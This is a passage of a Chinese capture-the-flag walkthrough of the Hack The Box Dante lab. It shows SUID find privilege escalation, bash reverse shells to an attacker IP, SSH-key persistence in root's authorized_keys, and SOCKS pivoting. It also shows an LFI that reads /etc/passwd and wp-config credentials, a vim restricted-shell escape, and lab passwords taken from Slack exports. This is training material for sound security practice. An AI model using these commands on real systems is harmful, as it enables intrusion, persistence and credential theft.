![](/image/prolabs/Dante-7.png)

![](/image/prolabs/Dante-8.png)

成功反弹

## 提权
```php
(remote) www-data@DANTE-WEB-NIX01:/home/james$ find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/find
/usr/bin/sudo
/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/snap/core20/1611/usr/bin/chfn
/snap/core20/1611/usr/bin/chsh
/snap/core20/1611/usr/bin/gpasswd
/snap/core20/1611/usr/bin/mount
/snap/core20/1611/usr/bin/newgrp
/snap/core20/1611/usr/bin/passwd
/snap/core20/1611/usr/bin/su
/snap/core20/1611/usr/bin/sudo
/snap/core20/1611/usr/bin/umount
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1611/usr/lib/openssh/ssh-keysign
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/core18/2246/bin/mount
/snap/core18/2246/bin/ping
/snap/core18/2246/bin/su
/snap/core18/2246/bin/umount
/snap/core18/2246/usr/bin/chfn
/snap/core18/2246/usr/bin/chsh
/snap/core18/2246/usr/bin/gpasswd
/snap/core18/2246/usr/bin/newgrp
/snap/core18/2246/usr/bin/passwd
/snap/core18/2246/usr/bin/sudo
/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2246/usr/lib/openssh/ssh-keysign
/snap/core18/2538/bin/mount
/snap/core18/2538/bin/ping
/snap/core18/2538/bin/su
/snap/core18/2538/bin/umount
/snap/core18/2538/usr/bin/chfn
/snap/core18/2538/usr/bin/chsh
/snap/core18/2538/usr/bin/gpasswd
/snap/core18/2538/usr/bin/newgrp
/snap/core18/2538/usr/bin/passwd
/snap/core18/2538/usr/bin/sudo
/snap/core18/2538/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2538/usr/lib/openssh/ssh-keysign
```

### find提权
 /usr/bin/find   尝试提权

[find 命令提权 - 内向是一种性格 - 博客园](https://www.cnblogs.com/aaak/p/15718561.html)

```powershell
执行命令
(remote) www-data@DANTE-WEB-NIX01:/home/james$ find `which find` -exec whoami \;
root
```

提权成功，反弹个shell

```powershell
vi shell

#!/bin/sh
bash -i >& /dev/tcp/10.10.16.80/6666 0>&1

chmod 777 shell
(remote) www-data@DANTE-WEB-NIX01:/tmp$ find `which` -exec /tmp/shell \;
```

这里反弹成功了但是权限仍是www

#### Linux 的“安全机制”：Shell 会主动丢掉 SUID
这是核心知识点 🔥

**事实是：**

**bash / sh 在被 SUID 程序调用时，默认会放弃 root 权限**

这是为了防止这种情况：

“普通用户 → 调用 SUID 程序 → 获得 root shell”

所以不要使用**bash / sh **

```powershell
find /etc/passwd -exec bash -ip >& /dev/tcp/10.10.16.80/6666 0>&1 \;
```

拿到root用户

## 权限维持
```powershell
ssh-keygen -t rsa -b 4096 -f ~/.ssh/vps_backup_key
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# cat vps_backup_key.pub                                 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmi0gixBC8Vki7L1VDlh8xoty58Zd4vcG4UoN/+8AzNo6GOCRuGxP8m9urHypBDc2CYgexHA4kC8jMSYSLOr9SoVQMCTgSHB4MV+mZ4rXrtFxMmXyQV8Zw3qn+1Bl7HatgiulKL5LFZb4oyt3TIdm4wNOE9hZVwbv9Wsj85DDS0+jJo0MUlsGZhguzvygaUFcCFO5qM/A7JbbqgZcgv/s7/g05stv29KDULXzFTwv3ANuCXypVk2z2tl/VBTrsRHk2QWdet70VZ6Hz4nlwt4CBo9+RUcSm7FqEcqdILPNk13qo2bANZzDvFP03RzHwrnzZg2piYeZUw8l5vyTtD5Z8fdidLd9Yfd2CJcDN30A55K3+rTzCCuKW2JH55Rl2H4VdNhCHMhoXqxE2hPXz7iwWCLTzbBGm/nF12H6oQAZxT/BdX2ldMtvwRGAOFFWaBuBxhbVsNzx5gB3/wzymS0I79XMs4pbuv3Giji0tJDStqHUh2ptM8ezm0Xe10Iu0RIS76H9mw3jWofpOHtY84GaqWDO8IyQhY2Q4jGd3IczahgbudDRMSN4jNakZ5rBN6/xcxxAhJnHb7VL08qlf8jk5UjZqEhlSXcVtB+tzbFmqV9jU6BOJ7F/0Ad1HF0V/HxLD03ylQEJpH5omtZSDm1UHfJo81JxZaKN4RzURw8F3xw== root@kali

(remote) root@DANTE-WEB-NIX01:/root/.ssh#
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmi0gixBC8Vki7L1VDlh8xoty58Zd4vcG4UoN/+8AzNo6GOCRuGxP8m9urHypBDc2CYgexHA4kC8jMSYSLOr9SoVQMCTgSHB4MV+mZ4rXrtFxMmXyQV8Zw3qn+1Bl7HatgiulKL5LFZb4oyt3TIdm4wNOE9hZVwbv9Wsj85DDS0+jJo0MUlsGZhguzvygaUFcCFO5qM/A7JbbqgZcgv/s7/g05stv29KDULXzFTwv3ANuCXypVk2z2tl/VBTrsRHk2QWdet70VZ6Hz4nlwt4CBo9+RUcSm7FqEcqdILPNk13qo2bANZzDvFP03RzHwrnzZg2piYeZUw8l5vyTtD5Z8fdidLd9Yfd2CJcDN30A55K3+rTzCCuKW2JH55Rl2H4VdNhCHMhoXqxE2hPXz7iwWCLTzbBGm/nF12H6oQAZxT/BdX2ldMtvwRGAOFFWaBuBxhbVsNzx5gB3/wzymS0I79XMs4pbuv3Giji0tJDStqHUh2ptM8ezm0Xe10Iu0RIS76H9mw3jWofpOHtY84GaqWDO8IyQhY2Q4jGd3IczahgbudDRMSN4jNakZ5rBN6/xcxxAhJnHb7VL08qlf8jk5UjZqEhlSXcVtB+tzbFmqV9jU6BOJ7F/0Ad1HF0V/HxLD03ylQEJpH5omtZSDm1UHfJo81JxZaKN4RzURw8F3xw== root@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# ssh -i vps_backup_key root@10.10.110.100
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-29-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


636 updates can be installed immediately.
398 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Wed Oct 27 08:09:21 2021
root@DANTE-WEB-NIX01:~# 
```

## 隧道搭建
```powershell
ssh -D 1234 -p 22 -i vps_backup_key root@10.10.110.100

socks5	127.0.0.1		1234
将其添加/etc/proxychains4.conf 

proxychains -q nmap 172.16.1.10 -sT -sV -Pn -T5
```



# 172.16.1.100
## 信息收集
```powershell
root@DANTE-WEB-NIX01:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.1.100  netmask 255.255.255.0  broadcast 172.16.1.255
        inet6 fe80::250:56ff:fe94:1d82  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:1d:82  txqueuelen 1000  (Ethernet)
        RX packets 123331  bytes 18891135 (18.8 MB)
        RX errors 0  dropped 53  overruns 0  frame 0
        TX packets 119255  bytes 22588430 (22.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3695  bytes 368364 (368.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3695  bytes 368364 (368.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### 内网ping扫描
```powershell
for i in {1..255};do(ping -c 1 172.16.1.$i|grep "bytes from"|cut -d' ' -f4|tr -d ':' &);done
```

```powershell
root@DANTE-WEB-NIX01:/# for i in {1..255};do(ping -c 1 172.16.1.$i|grep "bytes from"|cut -d' ' -f4|tr -d ':' &);done
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.19
172.16.1.17
172.16.1.20
172.16.1.100
172.16.1.101
172.16.1.102
```

```powershell
cat > targets.txt << 'EOF'
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.101
172.16.1.102
EOF

```

真没招，不好扫

直接买个硅谷服务器

### nmap扫描
```powershell
root@VM-0-14-debian:~/Hackthebox# proxychains -q nmap 172.16.1.10 -sT -sV -T5
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-30 19:09 CST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 1.77 seconds
root@VM-0-14-debian:~/Hackthebox# proxychains -q nmap 172.16.1.10 -sT -sV -Pn -T5
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-30 19:09 CST
Nmap scan report for 172.16.1.10
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

+ **第一次失败**：

```plain
nmap 172.16.1.10 -sT -sV -T5
```

👉 **nmap 先发 ICMP ping / TCP ping 探测主机是否存活**  
👉 **这些探测包没法被 proxychains 正确代理**  
👉 **被目标/网络丢弃**  
👉 nmap 误判：Host seems down ❌

+ **第二次成功**：

```plain
nmap 172.16.1.10 -sT -sV -Pn -T5
```

👉 `-Pn` = **“别 ping 了，我说它活着它就活着”**  
👉 直接对端口发 TCP connect  
👉 proxychains 能代理 TCP connect  
👉 扫描成功 ✅

---

# 172.16.1.10
![](/image/prolabs/Dante-9.png)

回顾下todx.txt

```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# cat todo.txt 
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS

- 完成 WordPress 权限变更 —— 待处理
- 在切换到 80 端口之前，更新链接以使用 DNS 名称 —— 待处理
- 移除另一个站点中的 LFI 漏洞 —— 待处理
- 将 James 的密码重置为更安全的密码 —— 待处理
- 在初级渗透测试员评估之前对系统进行加固 —— 进行中
```

- 移除另一个站点中的 LFI 漏洞 —— 待处理

尝试进行文件包含

```powershell
http://172.16.1.10/nav.php?page=../../../../etc/passwd
```

![](/image/prolabs/Dante-10.png)

思路是包含日志

但是没法访问

[http://172.16.1.10/nav.php?page=../../../../../../../../etc/passwd](http://172.16.1.10/nav.php?page=../../../../../../../../etc/passwd)

```powershell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
margaret:x:1001:1001::/home/margaret:/bin/lshell
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
omi:x:998:997::/home/omi:/bin/false
omsagent:x:997:998:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash
nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash
```

```plain
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
margaret:x:1001:1001::/home/margaret:/bin/lshell
...
omi:x:998:997::/home/omi:/bin/false
```

成功了！我们找到了新用户**弗兰克**和**玛格丽特 **。

此外，我们还将检查已识别的 SMB 共享，该共享无需密码即可访问：

## 下载admintasks.txt
```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─#  proxychains -q smbclient -L \\\\172.16.1.10
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SlackMigration  Disk      
        IPC$            IPC       IPC Service (DANTE-NIX02 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.16.1.10 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─#  proxychains -q smbclient \\\\172.16.1.10\\SlackMigration -N   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 12 10:39:41 2021
  ..                                  D        0  Thu Aug 25 16:43:55 2022
  admintasks.txt                      N      279  Mon May 18 11:24:22 2020

                13758504 blocks of size 1024. 1607568 blocks available

```

```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# cat admintasks.txt
-Remove wordpress install from web root - PENDING
-Reinstate Slack integration on Ubuntu machine - PENDING
-Remove old employee accounts - COMPLETE
-Inform Margaret of the new changes - COMPLETE
-Remove account restrictions on Margarets account post-promotion to admin - PENDING

- 从 Web 根目录中移除 WordPress 安装 —— 未完成
- 在 Ubuntu 机器上恢复 Slack 集成 —— 未完成
- 移除旧员工账户 —— 已完成
- 通知 Margaret 关于新的变更 —— 已完成
- 在 Margaret 晋升为管理员后，移除其账户限制 —— 未完成
```

看来这里还有另一个 WordPress 安装。我们尝试访问 /wordpress，但没有任何结果。

![](/image/prolabs/Dante-11.png)

很可能是“Dante Hosting”Web 应用程序安装在 /var/www/html/ 的子文件夹中，我们无法访问上一级目录。我们将利用本地文件包含漏洞 (LFI) 来检查 WordPress 是否真的存在。

如果我们访问 [http://172.16.1.10/nav.php?page=/var/www/html/index.html](http://172.16.1.10/nav.php?page=/var/www/html/index.html)   Apache默认页面会显示“It Works”，这意味着我们找到了正确的文件夹。

![](/image/prolabs/Dante-12.png)

## 读取wp-config
WordPress 页面应该位于 [http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php](http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php) 。结果什么都没有！

![](/image/prolabs/Dante-13.png)

原因是，我们需要使用封装器对 PHP 代码进行编码，否则浏览器将无法显示。因此，我们使用 PHP 封装器对 PHP 文件的内容进行 base64 编码：

[http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php](http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php)

可以使用 curl 和 base64 decode 命令从命令行自动解码 PHP 文件：

```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q curl "172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php"| base64 -d
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0          100   3864 100   3864   0      0   6304      0          100   3864 100   3864   0      0   6302      0          100   3864 100   3864   0      0   6301      0                              0
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

这样，我们就可以在 wp-config.php 中检索到以下内容：

```powershell
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

## ssh连接
```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains ssh margaret@172.16.1.10
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.10:22  ...  OK
The authenticity of host '172.16.1.10 (172.16.1.10)' can't be established.
ED25519 key fingerprint is SHA256:f7wic4X2i+93SkY15pQPkzP4FB2ltCqn1YAbTvZvQTY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.1.10' (ED25519) to the list of known hosts.
margaret@172.16.1.10's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

26 updates can be applied immediately.
3 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Tue Dec  8 05:17:13 2020 from 10.100.1.2
You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
margaret:~$ 
```

可以发现这是一个受限的shell

```powershell
margaret:~$ ls
*** forbidden command: ls
margaret:~$ help
cd  clear  exit  help  history  lpath  lsudo  vim
margaret:~$ 
```

只能使用vim

## 提权
### 提权-margaret
[vim | GTFOBins](https://gtfobins.org/gtfobins/vim/)

运行 `vim` ，然后在交互模式（底部）下输入以下命令：

`:set shell=/bin/sh|:shell`

```powershell
$ cd ~
$ ls
Desktop    Downloads  Music     Public  Templates
Documents  flag.txt   Pictures  snap    Videos
$ cat flag.txt
DANTE{LF1_M@K3s_u5_lol}
```

貌似已经都结束了，结果突然发现我们拿到的不是root权限



```c
$ whoami
margaret
$ cd /home
$ ls
frank  margaret  nxautomation
$ cd nxautomation
/bin/sh: 3: cd: can't cd to nxautomation
$ cd /
$ ls
1      dev   lib     lost+found  proc   sbin  tmp
bin    etc   lib32   media       root   snap  usr
boot   home  lib64   mnt         run    srv   var
cdrom  html  libx32  opt         samba  sys
$ cd root
/bin/sh: 6: cd: can't cd to root    
```

### 提权-frank
通过用户 Margaret 的 .config 文件夹，我们可以看到她使用了 Slack。（**“给公司用的高级版微信 + QQ 群 + 工单系统”**）

 👉 **Slack = 团队聊天 + 文件共享 + 自动化通知 的工作平台**

Slack 会缓存内容，也许我们能从中找到一些有价值的信息？！

```c
$ cat ~/.config/Slack/exported_data/secure/2020-05-18.json
[
    {
        "type": "message",
        "subtype": "channel_join",
        "ts": "1589794001.000200",
        "user": "U013CT40QHM",
        "text": "<@U013CT40QHM> has joined the channel"
    },
    {
        "type": "message",
        "subtype": "channel_purpose",
        "ts": "1589794001.000300",
        "user": "U013CT40QHM",
        "text": "<@U013CT40QHM> set the channel purpose: discuss network security",
        "purpose": "discuss network security"
    },
    {
        "type": "message",
        "subtype": "channel_join",
        "ts": "1589794007.000600",
        "user": "U014025GL3W",
        "text": "<@U014025GL3W> has joined the channel",
        "inviter": "U013CT40QHM"
    },
    {
        "client_msg_id": "24eb32d6-f430-4b09-9151-7678873d617e",
        "type": "message",
        "text": "Hi Margaret, I created the channel so we can discuss the network security - in private!",
        "user": "U013CT40QHM",
        "ts": "1589794069.001100",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "ga341d23f843",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "first_name": "",
            "real_name": "Frank",
            "display_name": "",
            "team": "T013LTDB554",
            "name": "htb_donotuse",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "oRyfi",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Hi Margaret, I created the channel so we can discuss the network security - in private!"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "2ffdee9d-a241-44c8-afb9-236519cc9f68",
        "type": "message",
        "text": "Great idea, Frank",
        "user": "U014025GL3W",
        "ts": "1589794079.001300",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "g368549a1713",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-72.png",
            "first_name": "",
            "real_name": "Margaret",
            "display_name": "Margaret",
            "team": "T013LTDB554",
            "name": "thisissecretright",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "xoKz",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Great idea, Frank"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "06348d4d-8155-447b-8493-cda0486770ec",
        "type": "message",
        "text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?",
        "user": "U013CT40QHM",
        "ts": "1589794187.002400",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "ga341d23f843",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "first_name": "",
            "real_name": "Frank",
            "display_name": "",
            "team": "T013LTDB554",
            "name": "htb_donotuse",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "OgTuz",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "4ef850bb-a93c-490f-9e99-b9198cc0ec67",
        "type": "message",
        "text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet",
        "user": "U014025GL3W",
        "ts": "1589794206.002900",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "g368549a1713",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/368549a1713abb8d1a5ec871da25b0ce.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0021-72.png",
            "first_name": "",
            "real_name": "Margaret",
            "display_name": "Margaret",
            "team": "T013LTDB554",
            "name": "thisissecretright",
            "is_restricted": false,
            "is_ultra_restricted": false
        },
        "blocks": [
            {
                "type": "rich_text",
                "block_id": "xuSlT",
                "elements": [
                    {
                        "type": "rich_text_section",
                        "elements": [
                            {
                                "type": "text",
                                "text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet"
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "client_msg_id": "c79fa547-1e2e-43ea-b61a-5d51e42110ca",
        "type": "message",
        "text": "Ahh sorry about that - its STARS5678FORTUNE401",
        "user": "U013CT40QHM",
        "ts": "1589794345.003500",
        "team": "T013LTDB554",
        "user_team": "T013LTDB554",
        "source_team": "T013LTDB554",
        "user_profile": {
            "avatar_hash": "ga341d23f843",
            "image_72": "https:\/\/secure.gravatar.com\/avatar\/a341d23f843e566bde18c04a566b47f3.jpg?s=72&d=https%3A%2F%2Fa.slack-edge.com%2Fdf10d%2Fimg%2Favatars%2Fava_0002-72.png",
            "first_name": "",
            "real_name": "Frank",
            "display_name": "",
